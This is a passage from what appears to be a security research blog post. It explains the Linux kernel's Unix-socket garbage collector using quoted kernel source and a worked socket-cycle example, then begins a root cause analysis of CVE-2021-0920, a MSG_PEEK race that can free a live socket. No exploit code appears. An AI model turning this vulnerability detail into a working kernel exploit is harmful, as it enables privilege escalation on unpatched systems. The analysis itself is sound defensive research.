 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; list_move</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">cursor</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">link</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">if</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">atomic_long_read</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">inflight</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c35 ykcrMYlEiJ-c7">0</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list_move_tail</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">link</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">not_cycle_list</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __clear_bit</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIX_GC_MAYBE_CYCLE</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">gc_flags</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; scan_children</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">sk</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;inc_inflight_move_tail</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;NULL</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">list_del</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">cursor</span><span class="ykcrMYlEiJ-c10">);</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Now </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>&nbsp;contains only &ldquo;garbage&rdquo;. The kernel restores original inflight counts from </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>, moves candidates from </span><span class="ykcrMYlEiJ-c3">not_cycle_list</span><span>&nbsp;back to </span><span class="ykcrMYlEiJ-c3">gc_inflight_list</span><span>&nbsp;and invokes </span><span class="ykcrMYlEiJ-c3">__skb_queue_purge</span><span>&nbsp;for cleaning up </span><span>garbage</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L306">garbage.c#L306</a></span><span class="ykcrMYlEiJ-c2">).</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.193055a25333ec1cdf4b6d039bbb9233e94a0884"></a><a id="t.11"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/* Now gc_candidates contains only garbage. &nbsp;Restore original</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* inflight counters for these as well, and remove the skbuffs</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* which are creating the cycle(s).</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">skb_queue_head_init</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">hitlist</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">list_for_each_entry</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">gc_candidates</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;link</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; scan_children</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;inc_inflight</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">hitlist</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/* not_cycle_list contains those sockets which do not make up a</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* cycle. &nbsp;Restore these to the inflight list.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">while</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(!</span><span class="ykcrMYlEiJ-c0">list_empty</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">not_cycle_list</span><span class="ykcrMYlEiJ-c10">))</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; u </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;list_entry</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">not_cycle_list</span><span class="ykcrMYlEiJ-c10">.</span><span class="ykcrMYlEiJ-c14">next</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sock</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;link</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; __clear_bit</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">UNIX_GC_CANDIDATE</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">gc_flags</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; list_move_tail</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">link</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">gc_inflight_list</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">spin_unlock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/* Here we are. Hitlist is filled. Die. */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">__skb_queue_purge</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">hitlist</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">spin_lock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c3">__skb_queue_purge</span><span>&nbsp;clears every </span><span class="ykcrMYlEiJ-c3">skb</span><span>&nbsp;from the receiver queue:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.ef5f1527ea6a99948aacf9ba31c9a016e0a52e01"></a><a id="t.12"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/**</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* &nbsp; &nbsp; &nbsp;__skb_queue_purge - empty a list</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* &nbsp; &nbsp; &nbsp;@list: list to empty</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* &nbsp; &nbsp; &nbsp;Delete all buffers on an &amp;sk_buff list. Each buffer is removed from</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* &nbsp; &nbsp; &nbsp;the list and one reference dropped. This function does not take the</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* &nbsp; &nbsp; &nbsp;list lock and the caller must hold the relevant locks to use it.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;skb_queue_purge</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;sk_buff_head </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">list</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">static</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">inline</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;__skb_queue_purge</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;sk_buff_head </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">list</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;sk_buff </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">while</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">((</span><span class="ykcrMYlEiJ-c0">skb </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;__skb_dequeue</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">list</span><span class="ykcrMYlEiJ-c10">))</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">!=</span><span class="ykcrMYlEiJ-c0">&nbsp;NULL</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree_skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">There are two ways to trigger the garbage collection process:</span></p><ol class="c27 lst-kix_58ja23nrczhl-0 start" start="1"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c3">wait_for_unix_gc</span><span>&nbsp;is invoked at the beginning of the </span><span class="ykcrMYlEiJ-c3">sendmsg</span><span class="ykcrMYlEiJ-c2">&nbsp;function if there are more than 16,000 inflight sockets</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>When a </span><span>socket file</span><span>&nbsp;is released by the kernel (i.e., a file descriptor is closed), the kernel will directly invoke </span><span class="ykcrMYlEiJ-c3">unix_gc</span><span class="ykcrMYlEiJ-c2">.</span></li></ol>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Note that </span><span class="ykcrMYlEiJ-c3">unix_gc</span><span>&nbsp;is not preemptive. If garbage collection is already in process, the kernel will not perform another </span><span class="ykcrMYlEiJ-c3">unix_gc</span><span class="ykcrMYlEiJ-c2">&nbsp;invocation.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Now, let&rsquo;s check this example (a breakable cycle) with a pair of sockets </span><span class="ykcrMYlEiJ-c8">f0</span><span class="ykcrMYlEiJ-c8 ykcrMYlEiJ-c40">0</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c8">f0</span><span class="ykcrMYlEiJ-c8 ykcrMYlEiJ-c40">1</span><span>,</span><span>&nbsp;and a single socket </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span>:</span></p><ol class="c27 lst-kix_51hgl6mwb3et-0 start" start="1"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Socket </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c8 ykcrMYlEiJ-c40">&nbsp;</span><span>to socket </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Socket </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;to socket </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span>.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Close </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Close </span><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>.</span></li></ol>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Before starting the garbage collection process, the status of socket file descriptors are:</span></p><ul style="padding: 0;" class="c27 lst-kix_yzib59bcdnhj-0 start"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">: ref = 1, inflight = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f&#8239;</span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">: ref = 1, inflight = 1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span class="ykcrMYlEiJ-c2">: ref = 1, inflight = 0</span></li></ul>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfD3EkqhRCP3nucxrm7-5h2T0Z0Q9e2xWhLX_CA07nU5IWXOAejwDvqPBd2CeJVLrM5bg502cpkm2noANVBV24QVmHRGA3IkHF_at3u6i2rYCHZH4wpvS5EfIC6ibJgtZb4LSO2IjdNbqw_PawxHzGAI9LtmhXRO5rv8SDTHa5mwncMXptSJmjnBZx/s834/image69.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfD3EkqhRCP3nucxrm7-5h2T0Z0Q9e2xWhLX_CA07nU5IWXOAejwDvqPBd2CeJVLrM5bg502cpkm2noANVBV24QVmHRGA3IkHF_at3u6i2rYCHZH4wpvS5EfIC6ibJgtZb4LSO2IjdNbqw_PawxHzGAI9LtmhXRO5rv8SDTHa5mwncMXptSJmjnBZx/s834/image69.png" border="0" alt="f00, f01 and alpha form a breakable cycle." style="max-height: 750px; max-width: 600px;"title="f00, f01 and alpha form a breakable cycle." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c32">Breakable cycle by </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c32">, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c32">&nbsp;and </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>During the garbage collection process, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c8 ykcrMYlEiJ-c40">&nbsp;</span><span>and </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c8 ykcrMYlEiJ-c40">&nbsp;</span><span>are considered garbage candidates. The inflight count of </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;is dropped to zero, but the count of </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;is still 1 because </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span>&nbsp;is not a candidate. Thus, the kernel will restore the inflight count from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&rsquo;s</span><span>&nbsp;receive queue. As a result, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;are not treated as garbage anymore.</span></p><h1 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.rjtckjrq5zqp"><span class="ykcrMYlEiJ-c47 ykcrMYlEiJ-c39">CVE-2021-0920 </span><span class="ykcrMYlEiJ-c39 ykcrMYlEiJ-c47">Root Cause Analysis</span></h1>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>When</span><span>&nbsp;a user receives </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;message from </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;without the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag, the kernel will wait until the garbage collection process finishes if it is in progress. However, if the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span class="ykcrMYlEiJ-c2">&nbsp;flag is on, the kernel will increment the reference count of the transmitted file structures without synchronizing with any ongoing garbage collection process. This may lead to inconsistency of the internal garbage collection state, making the garbage collector mark a non-garbage sock object as garbage to purge.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><h2 class="ykcrMYlEiJ-c20 ykcrMYlEiJ-c30" id="h.7lz5lcv6k4oi"><span>r</span><span class="ykcrMYlEiJ-c1">ecvmsg without MSG_PEEK flag</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The kernel function</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c3">unix_stream_read_generic</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L2290">af_unix.c#L2290</a></span><span>) parses the </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;message and manages the file inflight count when the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag is </span><span class="ykcrMYlEiJ-c39">NOT</span><span>&nbsp;set. Then, the function </span><span class="ykcrMYlEiJ-c3">unix_stream_read_generic</span><span>&nbsp;calls </span><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>&nbsp;to decrement the inflight count. Then, </span><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>&nbsp;clears the list of passed file descriptors (</span><span class="ykcrMYlEiJ-c3">scm_fp_list</span><span>) from the </span><span class="ykcrMYlEiJ-c3">skb</span><span class="ykcrMYlEiJ-c2">:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.0251da5f97c6a33bfc5ce0e11f69ded3f816103b"></a><a id="t.13"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
